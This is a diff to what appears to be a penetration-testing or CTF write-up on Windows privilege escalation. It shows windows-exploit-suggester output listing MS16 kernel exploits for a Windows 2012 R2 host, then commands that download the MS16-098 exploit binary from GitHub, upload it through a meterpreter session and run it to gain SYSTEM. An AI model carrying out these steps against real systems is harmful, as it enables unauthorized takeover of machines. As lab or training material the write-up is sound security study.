@@ -84,3 +84,55 @@ Make sure the sysinfo.txt file and the database file is placed in the same direc
 windows-exploit-suggest.py --update
 windows-exploit-suggester.py --database 2020-04-10-mssb.xls --systeminfo systeminfo.txt
 ```
+
+result:
+
+```
+[*] initiating winsploit version 3.3...                                                                                                                                      
+[*] database file detected as xls or xlsx based on extension                                                                                                                 
+[*] attempting to read from the systeminfo input file                                                                                                                        
+[+] systeminfo input file read successfully (ISO-8859-1)                                                                                                                     
+[*] querying database file for potential vulnerabilities                                                                                                                     
+[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits                                                                 
+[*] there are now 246 remaining vulns                                                                                                                                        
+[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin                                                                                                           
+[+] windows version identified as 'Windows 2012 R2 64-bit'                                                                                                                   
+[*]                                                                                                                                                                          
+[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important                                                                                          
+[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)                                                           
+[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)                         
+[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255                                                                                                            
+[*]                                                                                                                                                                          
+[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important                                                                                          
+[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)                                                         
+[*]                                                                                                                                                                          
+[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important                                                                                                   
+[*]   https://github.com/foxglovesec/RottenPotato                                                                                                                            
+[*]   https://github.com/Kevin-Robertson/Tater                                                                                                                               
+[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege                                          
+[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation                                                                       
+[*]                                                                                                                                                                          
+[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important                                                                                         
+[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074),
+ PoC                                                                                                                                                                         
+[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC                                            
+[*]                                                                                                                                                                          
+[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical                                                                                          
+[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
+...
+```
+
+The most interesting result so far is MS16–098. So let's try that.
+
+### Msfconsole
+
+first, background the meterpreter session. Then:
+
+```sh
+wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
+sessions <meterpreter session ID>
+upload 41020.exe
+shell
+41020.exe
+whoami # system
+```
